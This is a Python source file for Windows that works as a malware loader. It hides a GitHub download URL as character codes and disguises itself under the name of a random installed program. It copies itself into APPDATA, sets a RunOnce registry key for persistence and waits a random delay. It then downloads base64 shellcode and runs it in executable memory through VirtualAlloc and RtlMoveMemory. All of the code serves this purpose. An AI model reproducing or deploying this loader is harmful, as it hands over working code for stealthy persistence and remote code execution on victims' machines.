from urllib import request
import base64
import ctypes
import time
import random
import requests
from cryptography.fernet import Fernet
import sys
import os
import shutil
import winreg as reg

k32 = ctypes.windll.kernel32
encoded_url = [104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 74, 117, 109, 112, 121, 50, 50, 47, 72, 101, 108, 108, 99, 111, 100, 101, 47, 109, 97, 105, 110, 47, 98, 54, 52, 109, 115, 103, 98, 111, 120, 54, 52, 46, 98, 105, 110]


def is_in_appdata(pn):
    appdata_script_path = os.path.join(os.getenv('APPDATA'), pn, os.path.basename(sys.argv[0]))
    return os.path.isfile(appdata_script_path)

def make_enc_file(name):
	temp_dir = os.environ['TEMP'] if 'TEMP' in os.environ else os.environ['TMP']
	bname = base64.b64encode(name.encode('utf-8'))
	fullname = "beginRegex"+str(bname)+"endRegex"
	temp_file_path = os.path.join(temp_dir, fullname)
	try:
		with open(temp_file_path, 'w') as temp_file:
			temp_file.write("")
	except:
		print("I love u")
		
def find_temp_file():
    
    temp_dir = os.environ['TEMP'] if 'TEMP' in os.environ else os.environ['TMP']
    for filename in os.listdir(temp_dir):
        
        if filename.startswith("beginRegex") and filename.endswith("endRegex"):
            
            ripped_apart = filename[len("beginRegexb'"):]
            ripped_apart = ripped_apart[:-len("'endRegex")]
            decodedb = base64.b64decode(ripped_apart)
            return decodedb.decode('utf-8')

    
    return None

def random_program():
    programs = []
    for root, dirs, files in os.walk(os.environ['ProgramFiles'], topdown=True):
        if len(programs) < 11:
        	programs.extend(dirs)
        else:
        	break
    return random.choice(programs)

def move_to_startup(fp, rn):
    script_path = os.path.abspath(sys.argv[0])
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

    try:
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, rn, 0, reg.REG_SZ, fp)
    except Exception as e:
        return None

def copy_to_appdata(pn):
    script_path = os.path.abspath(sys.argv[0])
    appdata_path = os.path.join(os.getenv('APPDATA'), pn)
    appdata_script_path = os.path.join(appdata_path, os.path.basename(sys.argv[0]))

    try:
        os.makedirs(appdata_path, exist_ok=True)
        shutil.copyfile(script_path, appdata_script_path)
        return appdata_script_path
    except Exception as e:
        return None



def fetch_payload(url):
    with request.urlopen(url) as response:
        sc = base64.decodebytes(response.read())
    return sc

def write_memory(bef):
    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    ptr = k32.VirtualAlloc(None, len(bef), 0x3000, 0x40)
    k32.RtlMoveMemory(ptr, bef, len(bef))
    return ptr

def run(sc):
    bluffer = ctypes.create_string_buffer(sc)
    ptr = write_memory(bluffer)
    sf = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    sf()

if __name__ == "__main__":
    exists = find_temp_file()
    if not exists:
        impers = random_program()
        make_enc_file(impers)
        apppath = copy_to_appdata(impers)
        move_to_startup(apppath, impers)
    time.sleep(random.randint(20,30))
    run(fetch_payload("".join(chr(url_bytes) for url_bytes in encoded_url)))